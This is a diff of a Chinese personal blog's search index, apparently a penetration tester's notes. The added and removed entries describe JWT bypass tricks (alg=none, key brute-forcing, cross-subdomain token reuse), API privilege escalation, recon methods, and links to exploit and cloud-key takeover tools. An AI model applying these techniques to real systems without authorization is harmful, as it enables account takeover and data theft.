+<h6 id="—-同一域名使用"><a href="#—-同一域名使用" class="headerlink" title="—&gt;同一域名使用"></a>—&gt;同一域名使用</h6><p>​	拿网址举例，123.123.com的合法jwt，或许是可以到111.123.com的网址使用的，也就是说，如果你一个网址没有权限，可以先尝试去找一样域名的其他网址去注册一个合法用户，获得jwt后尝试直接使用该网址的功能</p>
+]]></content>
+      <categories>
+        <category>Cybersecurity</category>
+      </categories>
+      <tags>
+        <tag>api</tag>
+        <tag>js</tag>
+        <tag>Cybersecurity</tag>
+        <tag>jwt</tag>
+        <tag>keys</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>智能桌宠</title>
     <url>/2024/12/18/%E6%99%BA%E8%83%BD%E6%A1%8C%E9%9D%A2%E5%AE%A0%E7%89%A9/</url>
     <content><![CDATA[<p>该文章为尝试进行智能桌宠的搭建前记录的相关流程和笔记，以免自己行动时步骤不对直接爆炸；</p>
@@ -964,109 +1138,35 @@
       </tags>
   </entry>
   <entry>
-    <title>正则匹配脚本</title>
-    <url>/2024/12/23/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E8%84%9A%E6%9C%AC/</url>
-    <content><![CDATA[<h2 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h2><p>今天上班的时候，老是发现uuid这些长id，我要想利用又懒得一个个复制，所以搞了一个脚本扩展，因为我是新手嘛，所以这个脚本有蛮多毛病，这章专门用来介绍哪些毛病，方便以后想改了，拿出来看看好找到要改的地方，我脚本放到github了，以防自己改炸了还有备份</p>
+    <title>信息搜集思路</title>
+    <url>/2024/12/20/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E6%80%9D%E8%B7%AF/</url>
+    <content><![CDATA[<h1 id="信息搜集思路扩散"><a href="#信息搜集思路扩散" class="headerlink" title="信息搜集思路扩散"></a>信息搜集思路扩散</h1><p>​	1.ico图标搜集</p>
+<p>​	2.icp备案号&#x2F;icp.name备案公司搜集</p>
+<p>​	3.域名搜集———简写域名搜集&#x2F;子域名搜集</p>
 <span id="more"></span>
 
-<h2 id="问题点"><a href="#问题点" class="headerlink" title="问题点"></a>问题点</h2><p>1、python代码里只匹配了双引号和单引号</p>
-<p>2、直接将匹配到的内容写入文件—空格字符和回车字符</p>
-<p>3、没有检查匹配字符的过程—不能实时的查看自己的匹配过程	&#x2F;&#x2F;主要</p>
+<p>​	4.关键字搜寻-title&#x2F;body</p>
+<p>​	5.中标公司，名下公司查询—涉及就查</p>
+<p>​	6.证书查询</p>
+<p>​	7.图片搜索—基本没用</p>
+<p>​		1&gt;联合&#x2F;递归查询</p>
+<p>​		2&gt;爆破域名查询——-针对空间测绘找不到的影子资产</p>
+<p>​		3&gt;域名目录更改—–例如，ab.sb.com——&gt;ab.sb.com&#x2F;ab          目录爆破**</p>
+<h1 id="找网址漏洞的信息搜集思路"><a href="#找网址漏洞的信息搜集思路" class="headerlink" title="找网址漏洞的信息搜集思路"></a>找网址漏洞的信息搜集思路</h1><p>​	1.要是信息搜集能力强于web渗透思路如下</p>
+<p>​		1&gt;与其在网址上找漏洞不如，根据漏洞找对应网址</p>
+<p>​	2.web渗透强于其他</p>
+<p>​		2&gt;搜集边缘&#x2F;影子资产，从易到难</p>
+<h1 id="根据公众号找web的思路"><a href="#根据公众号找web的思路" class="headerlink" title="根据公众号找web的思路"></a>根据公众号找web的思路</h1><p>​	1.找合作公司的公众号，找相关的功能web</p>
+<p>​	2.找到公众号所有的web，根据域名找公司，根据公司找公众号，以此往复***</p>
+<p>​	3.根据全称公众号，找下面的无关公众号点点，可能存在你要找的内容功能</p>
 ]]></content>
       <categories>
         <category>Cybersecurity</category>
       </categories>
       <tags>
-        <tag>python</tag>
-        <tag>jython</tag>
-        <tag>Burp Suite</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>漏洞库</title>
-    <url>/2024/12/26/%E6%BC%8F%E6%B4%9E%E5%BA%93/</url>
-    <content><![CDATA[<p><a href="https://wiki.wy876.cn/#/">漏洞文库</a></p>
-<p><a href="https://github.com/wy876/POC">github漏洞库</a></p>
-]]></content>
-      <categories>
-        <category>Cybersecurity</category>
-      </categories>
-      <tags>
-        <tag>poc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>web和小程序的漏洞排查</title>
-    <url>/2024/12/20/%E7%AC%94%E8%AE%B0_js-request/</url>
-    <content><![CDATA[<p>该篇文章为记录在工作时遇到的基本问题以及对应的解决方式，以免自己把一些方法用完就忘，下次遇到又得🐔🐔</p>
-<h2 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h2><h3 id="过前端加密"><a href="#过前端加密" class="headerlink" title="过前端加密"></a>过前端加密</h3><p>​	在web端或者小程序中可能遇到请求包中的参数加密的情况，这种加密我一般用下面的两种处理方式。</p>
-<span id="more"></span>
-
-<h6 id="1、在js中找加密和解密算法"><a href="#1、在js中找加密和解密算法" class="headerlink" title="1、在js中找加密和解密算法"></a>1、在js中找加密和解密算法</h6><p>​		—如果是自定义算法你可中大奖了，你得解算法</p>
-<p>​		—&gt;适用于简单的、有框架可套的算法，例如：AES、DES、RSA-酌情考虑</p>
-<p>​		1&gt;主要是排查js代码中的加密函数和解密函数，小程序的话需要用工具调出控制台进行调试</p>
-<p>​		2&gt;排查的函数通常为encrypt、decrypt函数，简单的直接在源代码处ctrl+f找这两单词就行，复杂的需要交数据前暂停执行进行调试，可能有点抽象，给个图就好了</p>
-<p><img src="/../image/note_24_12/1_1-2.jpg" alt="1_1-2"></p>
-<p>​		3&gt;复杂的需要一步步找，一般是小程序需要调试，步骤如下：</p>
-<p>​			（1）、暂停执行</p>
-<p>​			（2）、输入框中输入数据</p>
-<p>​			（3）、点下一步，或者下一个函数</p>
-<p>​			（4）、等监视的数据突然加密了，就记下那个函数分析</p>
-<p>​			（5）、主要找加密算法是什么、iv和key，自定义算法和国密那些就用第二个方法吧</p>
-<p>​	小程序需要用工具调出，工具推荐如下：</p>
-<p>​			①、<a href="https://github.com/eeeeeeeeee-code/e0e1-wx">windows_自动化反编译</a> </p>
-<p>​			②、<a href="https://github.com/JaveleyQAQ/WeChatOpenDevTools-Python/releases/">WeChatOpenDevTools-Python</a> </p>
-<h6 id="2、在控制台中定义函数直接输入数据"><a href="#2、在控制台中定义函数直接输入数据" class="headerlink" title="2、在控制台中定义函数直接输入数据"></a>2、在控制台中定义函数直接输入数据</h6><p>​		1&gt;这个如果处理的好，在web端基本可以直接无需理会加密</p>
-<p>​			—&gt;需要比较熟练的使用python或者其他的代码，但是，熟练使用ai也行</p>
-<p>​		2&gt;有篇文章讲的很细，如下：</p>
-<p>​			—&gt;<a href="https://xz.aliyun.com/t/14629?time__1311=GqAhYK0KBKAIP05DKBOxmEr8RpQcC1aoD">保姆级教程—前端加密的对抗（附带靶场） - 先知社区</a> </p>
-<h6 id="3、other"><a href="#3、other" class="headerlink" title="3、other"></a>3、other</h6><p>​	—&gt;在应用软件中去壳逆向分析伪代码</p>
-<h3 id="jwt-api问题"><a href="#jwt-api问题" class="headerlink" title="jwt_api问题"></a>jwt_api问题</h3><p>​	我见识现在不多，有错误的地方，想起来了就回来改一下，没有想起来就错下去喽。</p>
-<p>​	jwt身份验证，一般情况不会给人伪造为空或者爆破出来密钥的机会，对我们有利的地方是通过正规途径获得一个合法的jwt后他们的接口通常不会有过多的权限管理，人话就是越权，逻辑洞可能比较多</p>
-<h6 id="1、尝试jwt绕过"><a href="#1、尝试jwt绕过" class="headerlink" title="1、尝试jwt绕过"></a>1、尝试jwt绕过</h6><h6 id="—-生产环境没成功过"><a href="#—-生产环境没成功过" class="headerlink" title="—&gt;生产环境没成功过"></a>—&gt;生产环境没成功过</h6><p>在渗透测试中，可以尝试以下几种JWT绕过方法—没有也要试试，成功就爽了</p>
-<p>​	1&gt;<strong>修改JWT令牌</strong>：通过修改JWT的Payload部分，可以尝试提升权限。例如，将用户角色从普通用户修改为管理员<a href="https://xz.aliyun.com/t/12906">1</a>。</p>
-<p>​	2&gt;<strong>利用过期令牌</strong>：有时即使JWT令牌已过期，服务器端可能仍然接受该令牌。通过修改令牌中的<em>exp</em>（过期时间）字段，可以尝试让过期令牌重新生效<a href="https://blog.csdn.net/yang1234567898/article/details/122226635">2</a>。</p>
-<p>​	3&gt;<strong>历史令牌伪造</strong>：如果能够获取到历史JWT令牌，可以尝试修改其中的<em>iat</em>（签发时间）和<em>exp</em>字段，使其看起来像是新签发的令牌<a href="https://blog.csdn.net/weixin_51559599/article/details/134860478">3</a>。</p>
-<p>​	4&gt;<strong>算法混淆</strong>：JWT头部中的<em>alg</em>字段指定了签名算法。如果服务器端没有正确验证该字段，可以尝试将其修改为<em>none</em>，绕过签名验证<a href="https://xz.aliyun.com/t/12906">1</a>。</p>
-<p>​	5&gt;<strong>密钥爆破</strong>：如果服务器使用了弱密钥，可以尝试使用密钥字典进行爆破，获取用于签名的密钥<a href="https://blog.csdn.net/yang1234567898/article/details/122226635">2</a>。</p>
-<p>​	6&gt;<strong>SQL注入绕过key</strong>：在某些情况下，如果JWT令牌中包含SQL注入漏洞，可以通过注入攻击绕过密钥验证<a href="https://blog.csdn.net/yang1234567898/article/details/122226635">2</a>。</p>
-<h6 id="2、利用jwt"><a href="#2、利用jwt" class="headerlink" title="2、利用jwt"></a>2、利用jwt</h6><h6 id="—-找api看越权"><a href="#—-找api看越权" class="headerlink" title="—&gt;找api看越权"></a>—&gt;找api看越权</h6><p>​	拿小程序来说，一般会直接给你一个jwt，这个jwt在服务器里面没有绑定任何用户，里面一般会有一个类似于openid的存在，当然有些要你注册或者登录才会响应一个jwt或者token</p>
-<p>​	1&gt;将小程序反编译出来的代码进行分析整理，可以用我上面给的自动化反编译的那个软件，主要整理出接口和网址</p>
-<p>​	2&gt;有接口就直接爆GET、POST、PUT、HEAD、TRACE等（生产环境没事别爆delete，爆成功等死）分析响应包，很明显的，一般就几种响应，要么200，要么权限不足，要么返回数据，要么说你类型错误，当然还有给你拉小黑屋的</p>
-<p>​	3&gt;有响应就分析操作；该方法主要是找api，不一定只有反编译的js里有，其本身小程序也是前端，可以尝试更改响应包跑前端的接口</p>
-<h6 id="—-同一域名使用"><a href="#—-同一域名使用" class="headerlink" title="—&gt;同一域名使用"></a>—&gt;同一域名使用</h6><p>​	拿网址举例，123.123.com的合法jwt，或许是可以到111.123.com的网址使用的，也就是说，如果你一个网址没有权限，可以先尝试去找一样域名的其他网址去注册一个合法用户，获得jwt后尝试直接使用该网址的功能</p>
-]]></content>
-      <categories>
-        <category>Cybersecurity</category>
-      </categories>
-      <tags>
-        <tag>api</tag>
-        <tag>js</tag>
-        <tag>Cybersecurity</tag>
-        <tag>jwt</tag>
-        <tag>keys</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>自动追番网址</title>
-    <url>/2024/12/25/%E8%87%AA%E5%8A%A8%E8%BF%BD%E7%95%AA%E7%BD%91%E5%9D%80/</url>
-    <content><![CDATA[<h1 id="网址"><a href="#网址" class="headerlink" title="网址"></a>网址</h1><p><a href="https://www.autobangumi.org/">AutoBangumi官网</a> —利用rss订阅字幕组，实现自动追番，部署比较轻松，docker部署</p>
-<p><a href="https://www.qbittorrent.org/download">qbittorrent下载地址</a> —下载器，订阅后这玩意负责自动下载，我1kG的流量就这么没的</p>
-<p><a href="https://emby.media/download.html">Emby下载地址</a> —播放器，其他的也可以，具体看bangumi和服务器支不支持</p>
-<span id="more"></span>
-
-<h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><p><img src="/../image/auto_anime/1.png"></p>
-<hr>
-<p><a href="https://github.com/wushuo894/ani-rss?tab=readme-ov-file">ani-rss项目地址-GitHub</a> —支持 <strong>Transmission</strong> <strong>qBittorrent</strong> <strong>Aria2</strong> 下载器</p>
-<p>ani-rss部署参考别个博客<a href="https://www.himiku.com/archives/ani-rss.html">初之音博客</a></p>
-]]></content>
-      <categories>
-        <category>anime</category>
-      </categories>
-      <tags>
-        <tag>rss</tag>
-        <tag>qBitTorrent</tag>
-        <tag>Two-dimensional</tag>
+        <tag>web</tag>
+        <tag>Information</tag>
+        <tag>Official account</tag>
       </tags>
   </entry>
   <entry>
@@ -1103,27 +1203,11 @@
         <category>Cybersecurity</category>
       </categories>
       <tags>
-        <tag>Cybersecurity</tag>
         <tag>Honeypot</tag>
+        <tag>Cybersecurity</tag>
         <tag>Information Gathering</tag>
         <tag>Intrusion Detection</tag>
         <tag>Attack Analysis</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>渗透工具&amp;项目推荐</title>
-    <url>/2025/04/23/%E9%A1%B9%E7%9B%AE&amp;%E5%B7%A5%E5%85%B7%E6%8E%A8%E8%8D%90/</url>
-    <content><![CDATA[<h1 id="GitHub项目："><a href="#GitHub项目：" class="headerlink" title="GitHub项目："></a>GitHub项目：</h1><p><strong>看目录查找，内容未制表</strong></p>
-<span id="more"></span>
-
-<h3 id="内网："><a href="#内网：" class="headerlink" title="内网："></a>内网：</h3><h5 id="内存码注入"><a href="#内存码注入" class="headerlink" title="内存码注入"></a>内存码注入</h5><h6 id="pap1rman"><a href="#pap1rman" class="headerlink" title="pap1rman"></a><a href="https://github.com/pap1rman/JNDIExploit-modify/commits?author=pap1rman">pap1rman</a></h6><h3 id="bp插件："><a href="#bp插件：" class="headerlink" title="bp插件："></a>bp插件：</h3><h5 id="爆破类"><a href="#爆破类" class="headerlink" title="爆破类"></a>爆破类</h5><h6 id="Hannah-PortSwigger"><a href="#Hannah-PortSwigger" class="headerlink" title="Hannah-PortSwigger"></a><a href="https://github.com/PortSwigger/turbo-intruder/commits?author=Hannah-PortSwigger">Hannah-PortSwigger</a></h6><h5 id="伪造类"><a href="#伪造类" class="headerlink" title="伪造类"></a>伪造类</h5><h6 id="隐藏bp的指纹特征"><a href="#隐藏bp的指纹特征" class="headerlink" title="隐藏bp的指纹特征"></a><a href="https://github.com/sleeyax/burp-awesome-tls">隐藏bp的指纹特征</a></h6><h6 id="伪造ip"><a href="#伪造ip" class="headerlink" title="伪造ip"></a><a href="https://github.com/TheKingOfDuck/burpFakeIP">伪造ip</a></h6><h3 id="探测漏洞："><a href="#探测漏洞：" class="headerlink" title="探测漏洞："></a>探测漏洞：</h3><h5 id="开源漏扫"><a href="#开源漏扫" class="headerlink" title="开源漏扫"></a>开源漏扫</h5><h6 id="afrog"><a href="#afrog" class="headerlink" title="afrog"></a><a href="https://github.com/zan8in/afrog">afrog</a></h6><h6 id="nuclei"><a href="#nuclei" class="headerlink" title="nuclei"></a><a href="https://github.com/projectdiscovery/nuclei">nuclei</a></h6><h6 id="dddd"><a href="#dddd" class="headerlink" title="dddd"></a><a href="https://github.com/SleepingBag945/dddd">dddd</a></h6><h5 id="框架-服务漏洞"><a href="#框架-服务漏洞" class="headerlink" title="框架&amp;服务漏洞"></a>框架&amp;服务漏洞</h5><h6 id="nacos-p-8848"><a href="#nacos-p-8848" class="headerlink" title="nacos-p-8848"></a><a href="https://github.com/Pizz33/nacos_vul">nacos-p-8848</a></h6><h6 id="winrm-p-5985"><a href="#winrm-p-5985" class="headerlink" title="winrm-p-5985 "></a><a href="https://github.com/Hackplayers/evil-winrm/commits?author=OscarAkaElvis">winrm-p-5985 </a></h6><h3 id="批量检测"><a href="#批量检测" class="headerlink" title="批量检测"></a>批量检测</h3><h5 id="存活检测"><a href="#存活检测" class="headerlink" title="存活检测"></a>存活检测</h5><h6 id="存活检测-httpx"><a href="#存活检测-httpx" class="headerlink" title="存活检测-httpx"></a><a href="https://github.com/projectdiscovery/httpx/commits?author=dogancanbakir">存活检测-httpx</a></h6><h3 id="云服务器漏洞排查"><a href="#云服务器漏洞排查" class="headerlink" title="云服务器漏洞排查"></a>云服务器漏洞排查</h3><h5 id="条件命令执行"><a href="#条件命令执行" class="headerlink" title="条件命令执行"></a>条件命令执行</h5><!--获取`accesskeyid`和`accesskeysecrets`后可使用工具接管云-->
-
-<h6 id="teamssix"><a href="#teamssix" class="headerlink" title="teamssix"></a><a href="https://github.com/teamssix/teamssix">teamssix</a></h6><h6 id="aliyun-accesskey-Tools"><a href="#aliyun-accesskey-Tools" class="headerlink" title="aliyun-accesskey-Tools"></a><a href="https://github.com/mrknow001/aliyun-accesskey-Tools">aliyun-accesskey-Tools</a></h6><h1 id="工具推荐"><a href="#工具推荐" class="headerlink" title="工具推荐"></a>工具推荐</h1><h5 id="代理工具"><a href="#代理工具" class="headerlink" title="代理工具"></a>代理工具</h5><h6 id="openvpn—统一网"><a href="#openvpn—统一网" class="headerlink" title="openvpn—统一网"></a>openvpn—统一网</h6><h6 id="SocksCap645—管理-强制代理"><a href="#SocksCap645—管理-强制代理" class="headerlink" title="SocksCap645—管理&amp;强制代理"></a>SocksCap645—管理&amp;强制代理</h6><h6 id="Proxifier—强制代理"><a href="#Proxifier—强制代理" class="headerlink" title="Proxifier—强制代理"></a>Proxifier—强制代理</h6><h6 id="Fiddler-Classic—强制代理【渗透工具】"><a href="#Fiddler-Classic—强制代理【渗透工具】" class="headerlink" title="Fiddler Classic—强制代理【渗透工具】"></a>Fiddler Classic—强制代理【渗透工具】</h6><h6 id="Charles—强制代理【渗透工具】"><a href="#Charles—强制代理【渗透工具】" class="headerlink" title="Charles—强制代理【渗透工具】"></a>Charles—强制代理【渗透工具】</h6>]]></content>
-      <categories>
-        <category>Cybersecurity</category>
-      </categories>
-      <tags>
-        <tag>project</tag>
       </tags>
   </entry>
 </search>
